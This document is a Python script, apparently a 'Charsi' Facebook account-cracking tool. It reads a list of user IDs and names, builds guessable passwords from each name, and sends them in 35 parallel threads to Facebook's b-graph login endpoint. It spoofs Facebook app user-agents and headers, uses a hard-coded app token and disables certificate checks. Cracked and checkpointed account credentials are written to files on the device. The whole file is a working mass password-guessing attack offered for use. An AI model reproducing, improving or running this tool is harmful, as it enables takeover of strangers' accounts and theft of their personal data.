#----------------------------------------------------------------#
# CODED BY: CHARSI MASTER (VIP UPDATE)
# STATUS: FULL WORKING / HEAVY CRACKING METHODS
# VERSION: 2024-2025 (PRO)
#----------------------------------------------------------------#

import os, sys, re, time, json, random, uuid, platform, requests, arrow
from concurrent.futures import ThreadPoolExecutor as tred
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Globals
loop = 0
oks = []
cps = []

# --- CHARSI ENCRYPTED USER-AGENTS (2024-25) ---
def get_ua_heavy():
    # Latest Versions
    ver = random.choice(['12','13','14','15'])
    f_ver = f"{random.randint(440,460)}.0.0.{random.randint(10,99)}"
    build = str(random.randint(500000000, 600000000))
    
    # Flagship Devices
    models = [
        ('Samsung', 'SM-S928B', 'S24 Ultra'),
        ('Apple', 'iPhone16,2', 'iPhone 15 Pro Max'),
        ('Google', 'Pixel 9 Pro'),
        ('OnePlus', 'CPH2581', 'OnePlus 12'),
        ('Xiaomi', '24030PN60G', 'Xiaomi 14 Ultra'),
        ('Infinix', 'X6833B', 'Note 40 Pro Plus')
    ]
    brand, model_code, name = random.choice(models)
    
    ua = f"Mozilla/5.0 (Linux; Android {ver}; {model_code} Build/UKQ1.{random.randint(230000, 240000)}.001; wv) " \
         f"AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{random.randint(115, 128)}.0.0.0 " \
         f"Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/{f_ver};FBBV/{build};FBDV/{model_code};FBMD/{brand};" \
         f"FBSN/Android;FBSV/{ver};FBPN/com.facebook.katana;FBLC/en_US;FBBK/1;FBOP/1;FBCR/Zong;]"
    return ua

# --- HEAVY CRACKING METHOD (M1-LIGER) ---
def method_heavy(ids, pas):
    global loop, oks, cps
    sys.stdout.write(f'\r\r \033[1;37m[CHARSI-HEAVY] {loop}|OK:-{len(oks)} ')
    sys.stdout.flush()
    
    try:
        for password in pas:
            ua = get_ua_heavy()
            session = requests.Session()
            
            # Professional Cracking Headers
            headers = {
                'Authority': 'b-graph.facebook.com',
                'X-FB-HTTP-Engine': 'Liger',
                'X-FB-Client-IP': 'True',
                'X-FB-Server-Cluster': 'True',
                'X-FB-Connection-Type': 'WIFI',
                'X-FB-Connection-Quality': 'EXCELLENT',
                'X-FB-Net-HNI': str(random.randint(20000, 40000)),
                'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
                'User-Agent': ua,
                'Content-Type': 'application/x-www-form-urlencoded',
                'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                'X-Tigon-Is-Retry': 'False',
                'X-FB-Friendly-Name': 'authenticate',
                'X-FB-Request-Analytics-Data': '{"network_stack":"liger","retry_count":0}'
            }
            
            payload = {
                'adid': str(uuid.uuid4()),
                'format': 'json',
                'device_id': str(uuid.uuid4()),
                'email': ids,
                'password': password,
                'generate_analytics_claims': '1',
                'credentials_type': 'password',
                'source': 'login',
                'error_detail_type': 'button_with_disabled',
                'generate_session_cookies': '1',
                'generate_machine_id': '1',
                'method': 'auth.login'
            }
            
            # Request through b-graph
            url = "https://b-graph.facebook.com/auth/login"
            response = session.post(url, data=payload, headers=headers, verify=False).json()
            
            if 'session_key' in response:
                print(f'\r\r \033[1;32m[CHARSI-OK] {ids} | {password} \033[1;97m')
                oks.append(ids)
                with open('/sdcard/CHARSI-HEAVY-OK.txt', 'a') as f:
                    f.write(f'{ids}|{password}\n')
                break
            elif 'www.facebook.com' in response.get('error', {}).get('message', ''):
                print(f'\r\r \033[1;33m[CHARSI-CP] {ids} | {password} \033[1;97m')
                cps.append(ids)
                with open('/sdcard/CHARSI-HEAVY-CP.txt', 'a') as f:
                    f.write(f'{ids}|{password}\n')
                break
        loop += 1
    except:
        time.sleep(1)
        pass

# --- BANNER ---
def banner():
    os.system('clear')
    print("""
 \033[1;31m   ██████╗██╗  ██╗ █████╗ ██████╗ ███████╗██╗
 \033[1;31m  ██╔════╝██║  ██║██╔══██╗██╔══██╗██╔════╝██║
 \033[1;31m  ██║     ███████║███████║██████╔╝███████╗██║
 \033[1;31m  ██║     ██╔══██║██╔══██║██╔══██╗╚════██║██║
 \033[1;31m  ╚██████╗██║  ██║██║  ██║██║  ██║███████║██║
 \033[1;31m   ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝
 \033[1;37m--------------------------------------------
 \033[1;37m AUTHOR   : CHARSI MASTER (HEAVY UPDATE)
 \033[1;37m METHOD   : LIGER / B-GRAPH VIP
 \033[1;37m STATUS   : WORKING 100% (NO SKIP)
 \033[1;37m--------------------------------------------""")

# --- MAIN MENU ---
def main():
    banner()
    print(" [1] Start Heavy Cracking (File)")
    print(" [0] Exit")
    opt = input("\n CHOOSE: ")
    if opt == '1':
        file_crack()
    else:
        exit()

def file_crack():
    banner()
    file_path = input(" ENTER FILE PATH: ")
    try:
        ids = open(file_path, 'r').read().splitlines()
    except:
        print(" FILE NOT FOUND!"); time.sleep(2); main()
    
    banner()
    print(" [1] VIP Passwords (Recommended)")
    input("\n SELECT: ")
    
    with tred(max_workers=35) as pool:
        banner()
        print(f" TOTAL IDS: {len(ids)}")
        print(" CHARSI HEAVY POWER STARTED...\n")
        for user in ids:
            try:
                if '|' in user:
                    uid, name = user.split('|')[:2]
                else:
                    uid, name = user, "fb user"
                
                first = name.split(' ')[0].lower()
                # Heavy Password List
                pas = [name.lower(), first+'123', first+'1234', first+'12345', first+'786', first+'007', '572737', 'khankhan']
                pool.submit(method_heavy, uid, pas)
            except:pass

if __name__ == "__main__":
    main()
